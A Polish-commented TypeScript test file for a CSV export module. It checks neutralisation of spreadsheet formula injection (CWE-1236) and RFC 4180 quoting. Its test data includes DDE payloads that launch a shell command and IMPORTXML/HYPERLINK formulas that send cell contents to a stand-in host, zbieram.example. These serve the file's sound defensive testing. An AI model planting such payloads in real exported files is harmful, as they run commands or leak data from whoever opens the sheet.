// Testy WSPÓLNEGO zapisu CSV: neutralizacja formuły + cytowanie RFC 4180.
//
// PO CO OSOBNY PLIK OBOK TESTÓW KONSUMENTÓW. Regres w tej regule jest regresem
// BEZPIECZEŃSTWA dla wszystkich eksportów naraz (subskrybenci, lista wykluczeń,
// leady wystawcy, raport audytowy płatności). Testy w panelach sprawdzają, czy
// panel woła zapis; ten plik sprawdza, czy zapis jest bezpieczny - i musi
// zapalić się natychmiast, bez uruchamiania testów UI.
//
// Ładunki poniżej są PUBLICZNIE OPISANE przykładami wstrzyknięcia formuły
// (OWASP: CSV Injection, CWE-1236). Żaden nie odwołuje się do prawdziwego
// hosta ani nie zawiera danych osobowych - domeny są z `example.*`.
import { describe, expect, it } from "vitest";

import { csvCell, csvFileNameFor, neutralizeCsvFormula, toCsv } from "../formatCsv";
import { parseCsv } from "../parseCsv";

/** Treść komórki tak, jak zobaczy ją arkusz - czyli po zdjęciu cytowania. */
function unquoted(cell: string): string {
  return cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
}

describe("neutralizeCsvFormula - wstrzyknięcie formuły (CWE-1236)", () => {
  // Pełny zestaw znaków otwierających formułę. TAB i CR są w zestawie, bo
  // arkusz obcina wiodące białe znaki PRZED rozpoznaniem zawartości.
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "poprzedza apostrofem wartość zaczynającą się od %j",
    (lead) => {
      expect(neutralizeCsvFormula(`${lead}CMD()`)).toBe(`'${lead}CMD()`);
    },
  );

  it.each([
    "=cmd|'/c calc'!A0",
    "=1+1",
    "+1+1",
    "-1+1",
    '-DDE("cmd";"/c calc";"!A0")',
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
    '=IMPORTXML(CONCAT("https://zbieram.example/?d=", A1), "//a")',
  ])("neutralizuje %j", (payload) => {
    expect(neutralizeCsvFormula(payload).startsWith("'")).toBe(true);
  });

  it("nie kasuje ładunku - wartość zostaje w pliku, tylko renderuje się literalnie", () => {
    // Kanarek intencji: neutralizacja NIE jest sanityzacją. Operator ma prawo
    // zobaczyć, co ktoś wpisał w formularz - to bywa dowodem nadużycia.
    const payload = '=HYPERLINK("https://zbieram.example/?d="&A1,"Faktura")';
    expect(neutralizeCsvFormula(payload)).toBe(`'${payload}`);
    expect(neutralizeCsvFormula(payload)).toContain("HYPERLINK");
  });

  it("apostrof jest dokładany RAZ, nie narastająco", () => {
    // Wartość już zaczynająca się od apostrofu nie jest formułą, więc nie
    // dostaje drugiego - inaczej wielokrotny eksport tego samego wiersza
    // hodowałby prefiks.
    expect(neutralizeCsvFormula("'=1+1")).toBe("'=1+1");
    expect(neutralizeCsvFormula(neutralizeCsvFormula("=1+1"))).toBe("'=1+1");
  });
});

describe("neutralizeCsvFormula - liczba zostaje LICZBĄ", () => {
  // To jest druga strona tej samej reguły. Prefiks nałożony bez rozróżnienia
  // zamienia kolumnę liczbową w kolumnę tekstową: arkusz przestaje sumować
  // i przestaje rysować wykres, czyli eksport traci zastosowanie.
  it.each(["-12.5", "+3", "0", "-0", "-49.00", "-1.5e-9", "+2.5E+3", "-12,5", "-3.20%", "-.5"])(
    "zostawia %j bez zmiany",
    (value) => {
      expect(neutralizeCsvFormula(value)).toBe(value);
    },
  );

  it("wyrażenie NIE jest liczbą, choć zaczyna się jak liczba", () => {
    // Granica reguły: `-1` to liczba, `-1+1` to formuła. Wyjątek na liczby nie
    // może być drogą obejścia neutralizacji.
    expect(neutralizeCsvFormula("-1")).toBe("-1");
    expect(neutralizeCsvFormula("-1+1")).toBe("'-1+1");
    expect(neutralizeCsvFormula("-1,5+A1")).toBe("'-1,5+A1");
    expect(neutralizeCsvFormula("+48 22 123 45 67")).toBe("'+48 22 123 45 67");
  });

  it("data i adres e-mail nie są w ogóle kandydatami", () => {
    // Reguła patrzy WYŁĄCZNIE na pierwszy znak: data zaczyna się od cyfry,
    // a `@` w środku adresu nie otwiera formuły.
    for (const value of ["2026-08-30", "2026-08-30T12:00:00.000Z", "anna@example.test"]) {
      expect(neutralizeCsvFormula(value), value).toBe(value);
    }
  });
});

describe("csvCell - kolejność: neutralizacja, potem cytowanie", () => {
  it("apostrof ląduje WEWNĄTRZ pola cytowanego", () => {
    // Odwrotna kolejność dałaby `'"=a,b"` - parser CSV zobaczyłby pole
    // niecytowane zaczynające się od apostrofu i cudzysłów w środku, czyli
    // neutralizacja zepsułaby strukturę pliku.
    expect(csvCell("=a,b")).toBe(`"'=a,b"`);
    expect(csvCell("=a,b").startsWith(`'"`)).toBe(false);
  });

  it("ładunek z cudzysłowem jest i zneutralizowany, i poprawnie zacytowany", () => {
    const cell = csvCell('-DDE("cmd")');
    expect(cell).toBe(`"'-DDE(""cmd"")"`);
    expect(unquoted(cell)).toBe(`'-DDE("cmd")`);
  });

  it("ładunek z wiodącym CR zostaje w polu cytowanym", () => {
    // Samo `\r` kończy wiersz w większości parserów, więc po dołożeniu
    // apostrofu wartość MUSI trafić w cudzysłowy - inaczej rozcina rekord.
    expect(csvCell("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("ładunek bez znaków strukturalnych nie jest cytowany bez potrzeby", () => {
    expect(csvCell("=cmd|'/c calc'!A0")).toBe("'=cmd|'/c calc'!A0");
  });
});

describe("csvCell - cytowanie RFC 4180 (bez zmian po dołożeniu neutralizacji)", () => {
  it("zwykła wartość idzie bez cytowania", () => {
    expect(csvCell("anna@example.test")).toBe("anna@example.test");
    expect(csvCell(42)).toBe("42");
  });

  it("przecinek, cudzysłów i nowa linia wymuszają cytowanie", () => {
    expect(csvCell("Nowak, Anna")).toBe('"Nowak, Anna"');
    expect(csvCell('Anna "Ania" Nowak')).toBe('"Anna ""Ania"" Nowak"');
    expect(csvCell("linia1\nlinia2")).toBe('"linia1\nlinia2"');
  });

  it("SAM powrót karetki też wymusza cytowanie", () => {
    expect(csvCell("linia1\rlinia2")).toBe('"linia1\rlinia2"');
  });

  it("średnik NIE jest separatorem w tym pliku, więc nie wymusza cytowania", () => {
    expect(csvCell("550; mailbox full")).toBe("550; mailbox full");
  });

  it("brak wartości daje pustą komórkę, a zero zostaje zerem", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(0)).toBe("0");
    expect(csvCell(-12.5)).toBe("-12.5");
  });
});

describe("toCsv - regres łapany na poziomie dokumentu", () => {
  it("ładunek w kolumnie tekstowej nie jest formułą po odczycie pliku", () => {
    const csv = toCsv(["display_name", "amount"], [["=cmd|'/c calc'!A0", -12.5]]);
    const parsed = parseCsv(csv);

    // To jest asercja końcowa całego zabezpieczenia: pierwszym znakiem, jaki
    // arkusz widzi w komórce, jest apostrof, a nie `=`.
    expect(parsed.rows[0][0].startsWith("'")).toBe(true);
    expect(parsed.rows[0][0]).not.toMatch(/^=/);
    // ...a kolumna liczbowa nadal zawiera liczbę, nie tekst z apostrofem.
    expect(parsed.rows[0][1]).toBe("-12.5");
    expect(Number(parsed.rows[0][1])).toBe(-12.5);
  });

  it("ładunek z przecinkiem nie rozjeżdża kolumn", () => {
    const csv = toCsv(
      ["display_name", "status"],
      [['=HYPERLINK("https://zbieram.example/?d="&A1,"Faktura")', "subscribed"]],
    );
    const parsed = parseCsv(csv);

    expect(parsed.rows).toHaveLength(1);
    expect(parsed.rows[0]).toHaveLength(2);
    expect(parsed.rows[0][1]).toBe("subscribed");
    expect(parsed.rows[0][0].startsWith("'=HYPERLINK(")).toBe(true);
  });

  it("wiersz z ładunkiem CR zostaje JEDNYM wierszem", () => {
    const csv = toCsv(["a", "b"], [["\r=1+1", "x"]]);
    const parsed = parseCsv(csv);

    expect(parsed.rows).toHaveLength(1);
    expect(parsed.rows[0][1]).toBe("x");
  });
});

describe("csvFileNameFor", () => {
  it("skleja prefiks z dniem eksportu, bez godziny", () => {
    expect(csvFileNameFor("newsletter", "2026-08-18T15:30:00.000Z")).toBe(
      "newsletter-2026-08-18.csv",
    );
  });
});
